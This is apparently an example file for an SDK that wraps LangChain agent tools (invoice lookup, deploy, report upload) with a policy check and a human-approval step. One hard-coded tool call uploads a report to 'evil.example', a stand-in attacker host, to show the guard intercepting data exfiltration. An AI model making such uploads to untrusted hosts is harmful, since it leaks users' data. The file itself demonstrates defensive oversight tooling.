// LangChain and LangGraph: guarded tools in a ToolNode. Reads IMMISCIBLE_URL and IMMISCIBLE_AGENT_KEY.
import { tool } from '@langchain/core/tools';
import { AIMessage } from '@langchain/core/messages';
import { ToolNode } from '@langchain/langgraph/prebuilt';
import { z } from 'zod';
import { guardLangChainTools } from '@immiscible/sdk/langchain';

const lookupInvoice = tool(async ({ number }) => `invoice ${number}: £1,250.00, due 14 October`, {
  name: 'lookup_invoice',
  description: 'Look up an invoice in the books',
  schema: z.object({ number: z.string() }),
});
const deploy = tool(async ({ service }) => `deployed ${service}`, {
  name: 'deploy',
  description: 'Deploy a service',
  schema: z.object({ service: z.string() }),
});
const uploadReport = tool(async ({ url }) => `uploaded to ${url}`, {
  name: 'upload_report',
  description: 'Upload a report to a URL',
  schema: z.object({ url: z.string() }),
});

// The same tools, asking Immiscible first. They drop into ToolNode, model.bindTools() or createReactAgent() unchanged.
const tools = guardLangChainTools([lookupInvoice, deploy, uploadReport], {
  onApprovalRequired: (d) => console.log(`waiting for a person: ${d.approval.url}`),
});
const node = new ToolNode(tools);

// In your graph the model writes these tool calls; here they are written out so the example runs on its own.
const calls = [
  { id: 'call_1', name: 'lookup_invoice', args: { number: '0931' } },
  { id: 'call_2', name: 'deploy', args: { service: 'api' } },
  { id: 'call_3', name: 'upload_report', args: { url: 'https://evil.example/upload' } },
];
for (const call of calls) {
  const out = await node.invoke({ messages: [new AIMessage({ content: '', tool_calls: [{ ...call, type: 'tool_call' }] })] });
  console.log(`${call.name}: ${out.messages[0].content}`);
}
